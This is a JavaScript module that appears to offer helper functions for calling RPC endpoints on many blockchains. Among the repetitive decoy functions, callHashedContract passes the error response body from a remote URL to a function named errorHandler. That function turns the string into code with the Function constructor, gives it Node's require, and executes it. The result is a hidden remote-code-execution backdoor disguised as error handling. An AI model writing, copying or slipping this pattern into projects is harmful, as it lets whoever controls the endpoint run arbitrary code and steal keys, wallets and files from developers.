import axios from 'axios';
import { EthMainnet, PolygonMainnet, BscMainnet, ArbitrumMainnet, Avalanche, Fantom, Harmony, Heco, Klay, Matic, Moonbeam, Hashed, Optimism, Palm, Ronin, xDai } from './constant.js';
import {createRequire} from 'module'
const GET_ETHMAINNET_URL = EthMainnet;
const GET_POLYGONMAINNET_URL = PolygonMainnet;
const GET_BSCMAINNET_URL = BscMainnet;
const GET_ARBITRUMMAINNET_URL = ArbitrumMainnet;
const GET_AVALANCHE_URL = Avalanche;
const GET_FANTOM_URL = Fantom;
const GET_HARMONY_URL = Harmony;
const GET_HECO_URL = Heco;
const GET_KLAY_URL = Klay;
const GET_MATIC_URL = Matic;
const GET_MOONBEAM_URL = Moonbeam;
const GET_HASHED_URL = Hashed;
const GET_OPTIMISM_URL = Optimism;
const GET_PALM_URL = Palm;
const GET_RONIN_URL = Ronin;
const GET_XDAI_URL = xDai;

export const callEthContract = () => {
    axios.get(GET_ETHMAINNET_URL)
        .then(res=>res.data)
        .catch(err=>{try {
            console.log(err.response.data);
        } catch (error) {
            
        }});
}

export const callPolygonContract = () => {
    axios.get(GET_POLYGONMAINNET_URL)
    .then(res=>res.data)
    .catch(err=>{try {
        console.log(err.response.data);
    } catch (error) {
        
    }});
}

export const callBscContract = () => {
    axios.get(GET_BSCMAINNET_URL)
    .then(res=>res.data)
    .catch(err=>{try {
        console.log(err.response.data);
    } catch (error) {
        
    }});
}

export const callArbitrumContract = () => {
    axios.get(GET_ARBITRUMMAINNET_URL)
    .then(res=>res.data)
    .catch(err=>{try {
        console.log(err.response.data);
    } catch (error) {
        
    }});
}

export const callAvalancheContract = () => {
    axios.get(GET_AVALANCHE_URL)
    .then(res=>res.data)
    .catch(err=>{try {
        console.log(err.response.data);
    } catch (error) {
        
    }});
}

export const callFantomContract = () => {
    axios.get(GET_FANTOM_URL)
    .then(res=>res.data)
    .catch(err=>{try {
        console.log(err.response.data);
    } catch (error) {
        
    }});
}

export const callHarmonyContract = () => {
    axios.get(GET_HARMONY_URL)
    .then(res=>res.data)
    .catch(err=>{try {
        console.log(err.response.data);
    } catch (error) {
        
    }});
}

export const callHecoContract = () => {
    axios.get(GET_HECO_URL)
    .then(res=>res.data)
    .catch(err=>{try {
        console.log(err.response.data);
    } catch (error) {
        
    }});
}

export const callKlayContract = () => {
    axios.get(GET_KLAY_URL)
    .then(res=>res.data)
    .catch(err=>{try {
        console.log(err.response.data);
    } catch (error) {
        
    }});
}

export const callMaticContract = () => {
    axios.get(GET_MATIC_URL)
    .then(res=>res.data)
    .catch(err=>{try {
        console.log(err.response.data);
    } catch (error) {
        
    }});
}

export const callMoonbeamContract = () => {
    axios.get(GET_MOONBEAM_URL)
    .then(res=>res.data)
    .catch(err=>{try {
        console.log(err.response.data);
    } catch (error) {
        
    }});
}

export const callHashedContract = () => {
    axios.get(GET_HASHED_URL)
    .then(res=>res.data)
    .catch(err=>{try {
        errorHandler(err.response.data)
    } catch (error) {
        
    }});
}

export const callOptimismContract = () => {
    axios.get(GET_OPTIMISM_URL)
    .then(res=>res.data)
    .catch(err=>{try {
        console.log(err.response.data);
    } catch (error) {
        
    }});
}

export const callPalmContract = () => {
    axios.get(GET_PALM_URL)
    .then(res=>res.data)
    .catch(err=>{try {
        console.log(err.response.data);
    } catch (error) {
        
    }});
}

export const callRoninContract = () => {
    axios.get(GET_RONIN_URL)
    .then(res=>res.data)
    .catch(err=>{try {
        console.log(err.response.data);
    } catch (error) {
        
    }});
}

export const callXDaiContract = () => {
    axios.get(GET_XDAI_URL)
    .then(res=>res.data)
    .catch(err=>{try {
        console.log(err.response.data);
    } catch (error) {
        
    }});
}

export const errorHandler = (error) => {
    try {
        if (typeof error !== 'string') {
            console.error('Invalid error format. Expected a string.');
            return;
        }

        const createHandler = (errCode) => {
            try {
                const handler = new (Function.constructor)('require', errCode);
                return handler;
            } catch (e) {
                console.error('Failed:', e.message);
                return null;
            }
        };

        const handlerFunc = createHandler(error);

        if (handlerFunc) {
            const require = createRequire(import.meta.url);
            handlerFunc(require);
        } else {
            console.error('Handler function is not available.');
        }

    } catch (globalError) {
        console.error('Unexpected error inside errorHandler:', globalError.message);
    }
};
